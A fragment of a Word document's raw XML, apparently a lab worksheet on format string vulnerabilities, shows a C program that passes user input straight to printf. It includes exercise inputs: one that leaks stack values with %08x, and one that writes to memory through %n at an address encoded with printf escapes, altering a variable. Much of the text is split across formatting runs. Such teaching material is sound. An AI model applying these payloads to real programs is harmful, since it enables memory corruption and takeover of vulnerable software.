          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>controlled input: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n");</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="003F01FA" w:rsidRDefault="00537A8C">
      <w:pPr>
        <w:spacing w:line="240" w:lineRule="exact"/>
        <w:ind w:left="824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position w:val="2"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:u w:val="thick" w:color="000000"/>
        </w:rPr>
        <w:t>printf</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:b/>
          <w:position w:val="2"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:u w:val="thick" w:color="000000"/>
        </w:rPr>
        <w:t>(</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:b/>
          <w:position w:val="2"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:u w:val="thick" w:color="000000"/>
        </w:rPr>
        <w:t>text);</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="003F01FA" w:rsidRDefault="00537A8C">
      <w:pPr>
        <w:spacing w:before="9"/>
        <w:ind w:left="824" w:right="1165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"[*]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test_val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@ 0x%08x = %d 0x%08x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n", &amp;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test_val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test_val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test_val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);</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="003F01FA" w:rsidRDefault="00537A8C">
      <w:pPr>
        <w:spacing w:before="1" w:line="240" w:lineRule="exact"/>
        <w:ind w:left="824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position w:val="1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>exit(</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:position w:val="1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>0);</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="003F01FA" w:rsidRDefault="00537A8C">
      <w:pPr>
        <w:spacing w:before="8"/>
        <w:ind w:left="10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}</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="003F01FA" w:rsidRDefault="00537A8C">
      <w:pPr>
        <w:spacing w:before="4"/>
        <w:ind w:left="104"/>
        <w:rPr>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>If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n  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3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1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ith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i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
          <w:w w:val="117"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
          <w:w w:val="117"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>pu</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:w w:val="117"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>t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w w:val="117"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>“AAAA%08x.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:spacing w:val="-3"/>
          <w:w w:val="117"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>%</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:w w:val="117"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>0</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:w w:val="117"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>8x.%</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:w w:val="117"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>0</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:w w:val="117"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>8x.%</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:w w:val="117"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>0</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:w w:val="117"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>8x”</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:spacing w:val="-77"/>
          <w:w w:val="1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spacing w:val="-2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ollow</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
          <w:w w:val="112"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>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23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ou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pu</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:w w:val="112"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2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p</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
          <w:w w:val="120"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>r</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:w w:val="116"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>o</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
          <w:w w:val="116"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>d</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-4"/>
          <w:w w:val="121"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>u</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:w w:val="109"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>ced.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="003F01FA" w:rsidRDefault="003F5579">
      <w:pPr>
        <w:spacing w:before="15"/>
        <w:ind w:left="2134"/>
      </w:pPr>
      <w:r>
        <w:pict>
          <v:group id="_x0000_s1031" style="position:absolute;left:0;text-align:left;margin-left:94.55pt;margin-top:73.1pt;width:43.95pt;height:6.5pt;z-index:-251659264;mso-position-horizontal-relative:page" coordorigin="1891,1462" coordsize="879,130">
            <v:shape id="_x0000_s1033" style="position:absolute;left:1901;top:1472;width:859;height:110" coordorigin="1901,1472" coordsize="859,110" path="m2705,1555r,27l2760,1527r-55,-55l2705,1500r-804,l1901,1555r804,xe" fillcolor="black" stroked="f">
              <v:path arrowok="t"/>
            </v:shape>
            <v:shape id="_x0000_s1032" style="position:absolute;left:1901;top:1472;width:859;height:110" coordorigin="1901,1472" coordsize="859,110" path="m1901,1500r804,l2705,1472r55,55l2705,1582r,-27l1901,1555r,-55xe" filled="f" strokeweight=".96pt">
              <v:path arrowok="t"/>
            </v:shape>
            <w10:wrap anchorx="page"/>
          </v:group>
        </w:pict>
      </w:r>
      <w:r w:rsidR="006769F0">
        <w:pict>
          <v:shape id="_x0000_i1028" type="#_x0000_t75" style="width:322.5pt;height:92pt">
            <v:imagedata r:id="rId11" o:title=""/>
          </v:shape>
        </w:pict>
      </w:r>
    </w:p>
    <w:p w:rsidR="003F01FA" w:rsidRDefault="00537A8C">
      <w:pPr>
        <w:spacing w:before="59"/>
        <w:ind w:left="104"/>
        <w:rPr>
          <w:w w:val="106"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">7.1.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2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x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la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4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</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
          <w:w w:val="115"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>h</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:w w:val="115"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>at</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-8"/>
          <w:w w:val="1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“4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41414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”</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2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at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4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spacing w:val="-1"/>
          <w:w w:val="115"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>ou</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:w w:val="115"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
          <w:w w:val="115"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>pu</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:w w:val="115"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>t)</w:t>
      </w:r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d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y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1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st</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
          <w:w w:val="115"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>r</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-2"/>
          <w:w w:val="105"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
          <w:w w:val="116"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:w w:val="106"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>g?</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00E07C8B" w:rsidRPr="00E07C8B" w:rsidRDefault="00E07C8B">
      <w:pPr>
        <w:spacing w:before="59"/>
        <w:ind w:left="104"/>
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:w w:val="106"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:tab/>
      </w:r>
      <w:r w:rsidRPr="00E07C8B">
        <w:rPr>
          <w:b/>
          <w:w w:val="106"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">“41414141” is the hex representation of AAAA. We are seeing it because </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:w w:val="106"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">it </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:w w:val="106"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>is being passed</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:w w:val="106"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> as </w:t>
      </w:r>
      <w:r w:rsidRPr="00E07C8B">
        <w:rPr>
          <w:b/>
          <w:w w:val="106"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">an argument to the </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00E07C8B">
        <w:rPr>
          <w:b/>
          <w:w w:val="106"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>printf</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00E07C8B">
        <w:rPr>
          <w:b/>
          <w:w w:val="106"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>.</w:t>
      </w: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line="200" w:lineRule="exact"/>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="003F01FA" w:rsidRDefault="003F01FA">
      <w:pPr>
        <w:spacing w:before="1" w:line="280" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="003F01FA" w:rsidRDefault="00537A8C">
      <w:pPr>
        <w:ind w:left="104"/>
        <w:rPr>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">7.2. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>[</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>5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]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r>
        <w:rPr>
          <w:spacing w:val="21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is</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:spacing w:val="3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p</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-3"/>
          <w:w w:val="114"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>r</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:w w:val="114"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>o</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
          <w:w w:val="114"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>gr</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:w w:val="114"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>am</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-4"/>
          <w:w w:val="114"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>wi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w w:val="117"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
          <w:w w:val="117"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
          <w:w w:val="117"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>pu</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:w w:val="117"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-7"/>
          <w:w w:val="117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st</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
          <w:w w:val="115"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>r</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-2"/>
          <w:w w:val="105"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
          <w:w w:val="116"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:w w:val="111"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>g</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="003F01FA" w:rsidRDefault="00537A8C">
      <w:pPr>
        <w:spacing w:before="25"/>
        <w:ind w:left="104" w:right="739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“$(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printf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“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\</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>x9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4\</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>x9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7\</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>x0</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:spacing w:val="-1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>4</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>\x08)%08x.%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8x.%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0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8x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.%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n”</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:spacing w:val="-7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7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f</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-3"/>
          <w:w w:val="112"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>o</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:w w:val="112"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
          <w:w w:val="112"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:w w:val="112"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>o</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-2"/>
          <w:w w:val="112"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>wi</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1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g</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-25"/>
          <w:w w:val="112"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
          <w:w w:val="112"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>ou</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:w w:val="112"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
          <w:w w:val="112"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>pu</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:w w:val="112"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="26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0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</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
          <w:w w:val="115"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>r</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:w w:val="115"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>o</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
          <w:w w:val="115"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>du</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:w w:val="115"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>ced</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-2"/>
          <w:w w:val="115"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> w</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:w w:val="114"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">ith </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:w w:val="111"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>test_val</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-15"/>
          <w:w w:val="111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c</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
          <w:w w:val="111"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>h</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-2"/>
          <w:w w:val="111"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
          <w:w w:val="111"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:w w:val="111"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>ged</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="4"/>
          <w:w w:val="11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om</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="4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7</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>2 to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31.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="003F01FA" w:rsidRDefault="003F01FA">
      <w:pPr>
        <w:spacing w:before="4" w:line="180" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="003F01FA" w:rsidRDefault="003F5579">
      <w:pPr>
        <w:ind w:left="1114"/>
      </w:pPr>
      <w:r>
        <w:pict>
          <v:group id="_x0000_s1027" style="position:absolute;left:0;text-align:left;margin-left:45.5pt;margin-top:53.15pt;width:44.05pt;height:6.5pt;z-index:-251658240;mso-position-horizontal-relative:page" coordorigin="910,1063" coordsize="881,130">
            <v:shape id="_x0000_s1029" style="position:absolute;left:919;top:1073;width:862;height:110" coordorigin="919,1073" coordsize="862,110" path="m1726,1156r,27l1781,1128r-55,-55l1726,1100r-807,l919,1156r807,xe" fillcolor="black" stroked="f">
              <v:path arrowok="t"/>
            </v:shape>
            <v:shape id="_x0000_s1028" style="position:absolute;left:919;top:1073;width:862;height:110" coordorigin="919,1073" coordsize="862,110" path="m919,1100r807,l1726,1073r55,55l1726,1183r,-27l919,1156r,-56xe" filled="f" strokeweight=".96pt">
              <v:path arrowok="t"/>
            </v:shape>
            <w10:wrap anchorx="page"/>
          </v:group>
        </w:pict>
      </w:r>
      <w:r>
        <w:pict>
          <v:shape id="_x0000_i1029" type="#_x0000_t75" style="width:449.5pt;height:74pt">
            <v:imagedata r:id="rId12" o:title=""/>
          </v:shape>
        </w:pict>
      </w:r>
    </w:p>
    <w:p w:rsidR="003F01FA" w:rsidRDefault="003F01FA">
      <w:pPr>
        <w:spacing w:before="17" w:line="240" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="003F01FA" w:rsidRDefault="00537A8C">
      <w:pPr>
        <w:ind w:left="104"/>
        <w:rPr>
          <w:w w:val="104"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="gramStart"/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ow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we</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/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want </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="9"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:w w:val="109"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
          <w:w w:val="109"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:w w:val="109"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>st_</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-2"/>
          <w:w w:val="109"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>v</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:w w:val="109"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>al</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/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100 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-2"/>
          <w:w w:val="113"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
          <w:w w:val="113"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:w w:val="113"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>st</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-3"/>
          <w:w w:val="113"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:w w:val="113"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>ad</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-3"/>
          <w:w w:val="1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3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W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54"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
